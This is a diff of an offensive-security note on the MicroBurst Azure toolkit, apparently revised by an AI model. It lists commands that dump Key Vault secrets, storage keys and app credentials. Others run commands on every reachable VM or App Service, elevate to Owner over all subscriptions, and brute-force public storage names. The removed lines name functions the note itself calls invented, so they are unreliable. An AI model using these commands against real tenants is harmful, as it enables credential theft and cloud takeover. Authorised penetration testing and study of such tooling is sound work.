@@ -17,82 +17,58 @@ Connect-AzAccount
 
 > [!note] **MicroBurst vs AADInternals** — AADInternals focuses on Entra ID / identity attacks (users, tokens, PRT, AD Connect). MicroBurst focuses on Azure resource enumeration and credential harvesting from storage, Key Vault, app configs. Use both on Azure engagements.
 
+> [!warning] **Verified against the module (2026-08).** MicroBurst does **not** expose granular `Get-AzKeyVaultSecrets` / `Get-AzStorageKeys` / `Get-AzAppSecrets` / `Get-AzVMs` / `Get-AzPermissions` etc. — those were invented in older notes. Almost everything funnels through **two flagship functions**: `Get-AzPasswords` (all credential stores) and `Get-AzDomainInfo` (all resources). Confirm with `Get-Command -Module MicroBurst`.
+
 ---
 
-## Credential Hunting
+## Credential Hunting — `Get-AzPasswords`
 
-The main reason to use MicroBurst — finds passwords, secrets, and keys left in Azure resources.
+The main reason to use MicroBurst. **One function** dumps every reachable credential store — Key Vault secrets/keys/certs, Storage Account keys, App Service & Function configs, Automation account credentials + connection strings, Container Registry admin creds, and more.
 
 ```powershell
-# The big one — dumps secrets from all accessible Azure resources
-# Checks: Key Vault, Storage Account keys, App Service configs, Automation accounts,
-#         Container registries, API Management, App registrations
-Get-AzPasswords
+# Dump everything (runs all sub-modules by default)
 Get-AzPasswords -Verbose
+Get-AzPasswords -Subscription <sub-id>          # scope to one subscription
+Get-AzPasswords -Verbose | Out-File creds.txt   # capture — output is long
 
-# Key Vault secrets
-Get-AzKeyVaultSecrets
-Get-AzKeyVaultSecrets -Subscription <sub-id>
-
-# Storage account keys (allows full storage access)
-Get-AzStorageKeys
-Get-AzStorageKeys -Subscription <sub-id>
-
-# App Service / Function App env vars (often contain DB strings, API keys)
-Get-AzAppSecrets
-Get-AzFunctionAppSecrets
-
-# Automation Account runbook credentials
-Get-AzAutomationCredentials
-
-# Container registry credentials
-Get-AzContainerRegistryCredentials
+# Related credential grabbers
+Get-AzWebAppTokens               # managed-identity / app tokens from App Services
+Get-AzKeyVaultsAutomation        # Key Vault access via Automation account context
+Get-AzArcCertificates            # Azure Arc-connected machine certs
+Get-AzMachineLearningCredentials # AML workspace secrets
 ```
 
 ---
 
-## Storage Enumeration
+## Resource Enumeration — `Get-AzDomainInfo`
 
 ```powershell
-# Find all storage accounts
-Get-AzStorageAccounts
-
-# Find publicly accessible storage containers/blobs (unauthenticated)
-Invoke-EnumerateAzureBlobs -Base <company-name>
-# Tries: <company>backup, <company>dev, <company>prod, <company>data, etc.
-
-# List blobs in a container
-Get-AzStorageAccountContents -StorageAccount <name> -StorageKey <key>
-
-# Search blobs for interesting content
-Get-MicroBurstAzureBlobs -StorageAccount <name> -StorageKey <key>
+# Full subscription recon in one shot — dumps to CSV/HTML under the output folder:
+# VMs, NICs/public IPs & NSG rules, storage accounts + keys, Key Vaults, web/function apps,
+# SQL servers/DBs, RBAC role assignments, users/groups, etc.
+Get-AzDomainInfo -Verbose
+Get-AzDomainInfo -Subscription <sub-id>
+Get-AzDomainInfoREST              # REST-based variant (no Az module dependency)
 ```
 
 ---
 
-## Resource Enumeration
+## Command Execution & Lateral Movement
 
 ```powershell
-# Full subscription recon
-Get-AzDomainInfo
-# Returns: VMs, storage accounts, Key Vaults, web apps, SQL servers, NSG rules
+# Run a command on EVERY VM you can reach (needs Microsoft.Compute/.../runCommand)
+Invoke-AzVMBulkCMD -Script "whoami" -output results.txt
+Invoke-AzVMCommandREST -Script "whoami"          # REST variant
 
-# Network exposure — find externally accessible resources
-Get-AzNetworkInfo
-Get-AzPublicIPs
+# App Service / Kudu command execution (webshell-equivalent on a web app)
+Invoke-AzAppServicesCMD -command "whoami" -appName <app-name>
+Invoke-AzAppServKuduCMDExec -appName <app-name>
 
-# Virtual machines
-Get-AzVMs
+# Run a rogue Automation runbook (exec as the Automation account's identity)
+Invoke-AzRunbook -Verbose
 
-# SQL servers and databases
-Get-AzSQLServers
-
-# Web apps and Function apps
-Get-AzWebApps
-Get-AzFunctionApps
-
-# VMs with script extensions (potential code exec / lateral movement)
-Get-AzVMExtensions
+# Azure Bastion shareable-link abuse (persistent RDP/SSH exposure)
+Get-AzRestBastionShareableLink
 ```
 
 ---
@@ -100,17 +76,13 @@ Get-AzVMExtensions
 ## Privilege Escalation
 
 ```powershell
-# Find over-permissive role assignments
-Get-AzRoleAssignments
+# The classic MicroBurst privesc: if you hold User Access Administrator eligibility,
+# toggle "Access management for Azure resources" ON to grant yourself Owner over ALL
+# subscriptions in the tenant (root-scope elevation).
+Invoke-AzElevatedAccessToggle
 
-# Check current user permissions
-Get-AzPermissions
-
-# Find managed identities with high privileges
-Get-AzManagedIdentities
-
-# VM Run Command — execute commands if Microsoft.Compute/.../runCommand allowed
-Invoke-AzVMCommand -ResourceGroupName <rg> -VMName <vm> -Command 'whoami /all'
+# ACR token generation (registry access → pull/push malicious images)
+Invoke-AzACRTokenGenerator
 ```
 
 ---
@@ -118,14 +90,17 @@ Invoke-AzVMCommand -ResourceGroupName <rg> -VMName <vm> -Command 'whoami /all'
 ## Unauthenticated Storage Brute Force
 
 ```powershell
-# Find open/public Azure storage accounts by guessing names (no auth needed)
-Invoke-EnumerateAzureBlobs -Base <company-name>
-Invoke-EnumerateAzureSubDomains -Base <company-name>
-# Checks: blobs, files, tables, queues, static sites
+# Find open/public Azure storage by guessing account names (no auth needed)
+Invoke-EnumerateAzureBlobs      -Base <company-name>    # blobs in a named account
+Invoke-EnumerateAzureSubDomains -Base <company-name>    # *.blob/file/table/queue/web/etc.
 ```
 
 ---
 
+> [!note] **See also** — pair with [[Tools/Cloud/AADInternals|AADInternals]] (identity/Entra side) and [[Tools/Cloud/ScoutSuite|ScoutSuite]] (misconfig audit); the ARM-token abuse primitives overlap [[Tools/Cloud/BARK|BARK]]'s `*-AzureRM*` functions.
+
+---
+
 *Created: 2026-03-06*
-*Updated: 2026-03-06*
-*Model: claude-sonnet-4-6*
+*Updated: 2026-08-27*
+*Model: claude-opus-5*
